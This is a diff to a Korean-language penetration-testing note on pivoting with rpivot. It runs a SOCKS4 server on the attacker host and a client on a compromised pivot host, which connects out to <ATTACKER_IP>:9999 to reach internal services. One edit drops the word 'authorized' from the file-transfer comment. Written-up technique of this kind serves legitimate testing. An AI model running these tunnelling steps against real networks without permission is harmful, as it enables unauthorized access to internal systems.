@@ -13,13 +13,7 @@ tags:
 
 공격 호스트에서 `<PIVOT_IP>`로 inbound 연결은 불가하지만 셀을 보유한 피벗 호스트에서 `<ATTACKER_IP>:9999`와 `<INTERNAL_IP>:<PORT>`로 연결할 수 있으면, 공격 호스트에 rpivot SOCKS4 listener를 열어 내부 TCP 경로를 만든다.
 
-## 사용할 때
-
-- 현재 네트워크 위치: 공격 호스트에서 `<PIVOT_IP>`로 직접 inbound 연결은 만들 수 없지만, 피벗 호스트에서 `<ATTACKER_IP>:9999` outbound TCP는 가능하다.
-- 명령 실행 위치: `server.py`와 ProxyChains 클라이언트는 공격 호스트에서, `client.py`는 셀을 보유한 피벗 호스트에서 실행한다. 이 문서의 `reverse`는 피벗 client가 제어 연결을 시작하고 공격 호스트에 SOCKS listener가 생기며 피벗이 최종 연결을 만드는 배치다. 다른 reverse forward와의 차이는 [[피벗과 터널의 연결 경계]]를 따른다.
-- 현재 계정·권한: 피벗 호스트의 현재 셀 계정으로 Python2와 `client.py`를 실행하고 outbound socket을 열 수 있어야 한다. root 권한은 rpivot 실행의 필수 조건이 아니다.
-- 도달해야 하는 대상: 피벗 호스트에서 직접 응답하는 `<INTERNAL_IP>:<PORT>` 웹 또는 TCP 서비스다.
-- 성공 범위: 공격 호스트의 `127.0.0.1:9050` SOCKS4를 거쳐 `<INTERNAL_IP>:<PORT>`의 서비스 응답을 받는다. 서비스 인증, 원격 명령 실행과 관리자 권한은 아직 획득하지 않은 상태다.
+피벗 client의 outbound 제어 연결, 공격 호스트 SOCKS4 listener와 피벗이 만드는 최종 TCP 연결은 [[피벗과 터널의 연결 경계]]처럼 분리해 확인한다.
 
 ## 전제 조건
 
@@ -48,6 +42,8 @@ tags:
 
 ### 공격 호스트에서 server 실행
 
+`<ATTACKER_IP>`는 피벗에서 outbound TCP로 도달하는 공격 호스트 주소(예: `198.51.100.8`)이고, `<INTERNAL_IP>:<PORT>`는 피벗에서 확인한 최종 서비스(예: `192.0.2.10:80`)다. 이 블록은 공격 호스트의 Python 2 셸에서 실행하며, 이어지는 `client.py`는 피벗 호스트에서 같은 주소를 사용한다.
+
 ```bash
 ss -ltnp 'sport = :9050 or sport = :9999'
 python2 server.py --proxy-ip 127.0.0.1 --proxy-port 9050 --server-port 9999 --server-ip <ATTACKER_IP> &
@@ -65,7 +61,7 @@ ps -p "$RPIVOT_SERVER_PID" -o pid=,args=
 ```bash
 test ! -e '<RPIVOT_CLIENT_DIRECTORY>'
 mkdir -m 700 '<RPIVOT_CLIENT_DIRECTORY>'
-# 승인된 파일 전송 절차로 client.py와 의존 파일을 이 전용 디렉터리에 반입하고 exact 경로 목록을 기록한다.
+# 파일 전송 절차로 client.py와 의존 파일을 이 전용 디렉터리에 반입하고 exact 경로 목록을 기록한다.
 cd '<RPIVOT_CLIENT_DIRECTORY>'
 python2 client.py --server-ip <ATTACKER_IP> --server-port 9999 &
 RPIVOT_CLIENT_PID=$!
